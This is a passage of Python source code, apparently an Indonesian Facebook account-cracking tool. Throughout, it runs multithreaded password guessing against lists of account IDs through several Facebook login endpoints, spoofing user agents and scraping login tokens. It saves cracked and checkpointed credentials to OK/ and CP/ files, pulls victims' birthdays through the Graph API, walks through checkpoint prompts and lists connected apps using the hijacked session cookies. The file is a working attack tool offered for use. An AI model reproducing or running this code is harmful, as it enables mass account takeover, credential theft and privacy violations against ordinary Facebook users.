        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n \033[1;37m[\033[1;91m"+str(opt+1)+"\033[1;37m] "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,results):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':results})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':results})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n \033[1;37m[\033[1;91m•\033[1;33m•\033[1;37m] '+celeng)
        except:pass
    print(h_ok+''.join(apk))

class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        _deku_uraraka("\n %s[%s•%s•%s] Crack pake sandi default/manual [d/m] "%(p,m,k,p))
        while True:
            _deku_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
            if _deku_ in [""]:
                _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
            elif _deku_ in ['m','M']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            _deku_uraraka("\n %s[%s•%s•%s] %s"%(p,m,k,p,e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("<=>")[0]})
                        except:continue
                except Exception as e:
                    _deku_uraraka("\n %s[%s•%s•%s] %s"%(p,m,k,p,e))
                    continue
                _deku_uraraka("\n %s[%s•%s•%s] Contoh sandi: sayang, kontol, anjing"%(p,m,k,p))
                self.pwlist()
                break
            elif _deku_ in ['d','D']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
                        except:continue
                    start_method()
                    _deku_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
                    if _deku_ in ['']:
                        _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                    elif _deku_ in ['1','01']:
                        _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                        _pil_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                        if _pil_ in ['']:
                            _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                        elif _pil_ in ['y','Y']:
                            test()
                            ThreadPool(35).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif _pil_ in ['t','T']:
                            started()
                            ThreadPool(35).map(self.api,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
                    elif _deku_ in ['2','02']:
                        _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                        _pil_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                        if _pil_ in ['']:
                            _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                        elif _pil_ in ['y','Y']:
                            test()
                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif _pil_ in ['t','T']:
                            started()
                            ThreadPool(35).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
                    elif _deku_ in ['3','03']:
                        _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                        _pil_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                        if _pil_ in ['']:
                            _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong");exit()
                        elif _pil_ in ['y','Y']:
                            test()
                            ThreadPool(35).map(self.free_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif _pil_ in ['t','T']:
                            started()
                            ThreadPool(35).map(self.free,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                             _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
                    else:
                        _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
                except Exception as e:
                    _deku_uraraka("\n %s[%s•%s•%s] %s"%(p,m,k,p,e));exit()
    def pwlist(self):
        self.pw =__in__deku__(" %s[%s•%s•%s] Sandi: "%(p,m,k,p)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            _deku_=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
            if _deku_ in ['']:
                _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
            elif _deku_ in ['1','01']:
                _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                _deku=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                if _deku in ['']:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                elif _deku in ['y','Y']:
                    test()
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif _deku in ['t','T']:
                    started()
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
            elif _deku_ in ['2','02']:
                _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                _deku=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                if _deku in ['']:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                elif _deku in ['y','Y']:
                    test()
                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif _deku in ['t','T']:
                    started()
                    ThreadPool(30).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
            elif _deku_ in ['3','03']:
                _deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? [y/t]"%(p,m,k,p))
                _deku=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
                if _deku in ['']:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
                elif _deku in ['y','Y']:
                    test()
                    ThreadPool(30).map(self.free_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif _deku in ['t','T']:
                    started()
                    ThreadPool(30).map(self.free,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
            else:
                _deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p));exit()
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _deku_uraraka(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _deku_uraraka(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _deku_uraraka(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue

            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),
                    i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp=(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        cek_log(fl.get("id"),i,h_cp)
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp=(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_log(fl.get("id"),i,h_cp)
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _deku_uraraka(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue

            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.api_opsi(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _deku_uraraka(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _deku_uraraka(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok=("\r ~~> %s • %s    "%(fl.get("id"),i,(fl.get("id"))))
 
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)
    def mbasic_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp=(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp=(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok=(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic_opsi(fl)
    def free(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _deku_uraraka(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _deku_uraraka(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok=(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_apk(h_ok,koki(log.get("cookies")))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.free(fl)
    def free_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_free(fl.get("id"),
                    i,"https://free.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp=(("\r\x1b[0;33m * --> %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
                        cek_log(fl.get("id"),i,h_cp)
                        print("")
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    h_cp=(("\r\x1b[0;33m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    h_ok=(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
                    
            self.ko+=1
            print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.free_opsi(fl)

def start_method():
    _deku_uraraka("\n%s [%s01%s] Crack pake B-api"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Crack pake Mbasic"%(p,k,p))
    _deku_uraraka("%s [%s03%s] Crack pake Free fb"%(p,k,p))
def started():
    _deku_uraraka("\n %s[%s•%s•%s] Acccount [ok] tersimpan di ok/%s "%(p,m,k,p,tanggal))
    _deku_uraraka(" %s[%s•%s•%s] Acccount [cp] tersimpan di cp/%s "%(p,m,k,p,tanggal))
    _deku_uraraka(" %s[%s•%s•%s] Mode pesawat 5/10 detik jika tidak ada hasil!"%(p,m,k,p))

def folder():
    try:
        os.mkdir("CP")
    except:pass
    try:
        os.mkdir("OK")
    except:pass

if __name__=="__main__":
    os.system("git pull")
    folder()
    menu()
# Mau Ngapain Cuk?
